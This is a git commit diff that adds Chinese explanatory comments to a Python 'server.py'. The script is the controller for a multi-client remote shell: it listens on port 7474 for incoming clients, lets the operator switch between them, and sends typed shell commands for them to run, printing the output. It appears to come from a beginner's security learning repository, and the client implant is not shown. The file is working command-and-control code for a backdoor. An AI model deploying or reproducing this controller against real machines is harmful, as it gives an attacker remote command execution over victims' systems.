127dd14e70a540c2aeff8da63a506d512ba164ef
Chen2358 <1430535115@qq.com>
2018-10-08 09:48:50 +0800

    Update server.py

--- safe/rookie/server.py
+++ safe/rookie/server.py
@@ -1,43 +1,47 @@
 #/usr/bin/env python3
 # -*-coding: utf-8 -*
 
+'''
+控制端，监听端口等待被连接
+'''
+
 import socket
 import threading
 
 
 
-clientList = []				#
-curClient = None			#
-quitThread = False			#
+clientList = []				#连接的客户端列表
+curClient = None			#当前的客户端
+quitThread = False			#是否退出线程
 lock = threading.Lock()
 
 
-#
+#负责发送shell命令和接受结果
 def shell_ctrl(socket, addr):
 	while True:
-		com = input(str(addr[0]) + ':~#')
-		if com == '!ch':
+		com = input(str(addr[0]) + ':~#')	#等待输入命令
+		if com == '!ch':			#切换client
 			select_client()
 			return
-		if com == '!q':
+		if com == '!q':				#退出控制端
 			quitThread = True
 			print('--------------------* Connection has ended* ---------------------------')
 			exit(0)
-		socket.send(com.encode('utf-8'))
-		data = socket.recv(1024)
-		print(data.decode('utf-8'))
+		socket.send(com.encode('utf-8'))	#发送命令的字节码
+		data = socket.recv(1024)		#接受返回的结果
+		print(data.decode('utf-8'))		#输出结果
 
-
+#选择客户端
 def select_client():
 	global clientList
 	global curClient
 	print('---------------------* The Current is connected to the cllient: *-----------------------')
-	for i in range(len(clientList)):
+	for i in range(len(clientList)):	#输出已经连接到控制端的client地址
 		print('[%i]-> %s' % (i, str(clientList[i][1][0])))
 	print('Please select a client!')
 
 	while True:
-		num = input('client num: ')
+		num = input('client num: ')	#等待输入一个带选择地址的序号
 		if int(num) >= len(clientList):
 			print('Please input a corrent num!')
 			continue
@@ -63,9 +67,9 @@ def wait_connect(sk):
 		lock.release()
 
 def main():
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.bind(('0.0.0.0', 7474))
-	s.listen(1024)
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)		#创建一个TCP Socket
+	s.bind(('0.0.0.0', 7474))					#绑定7474端口，并与允许来自任意地址的连接
+	s.listen(1024)							#开始监听
 
 	t = threading.Thread(target=wait_connect, args=(s,))
 	t.start()
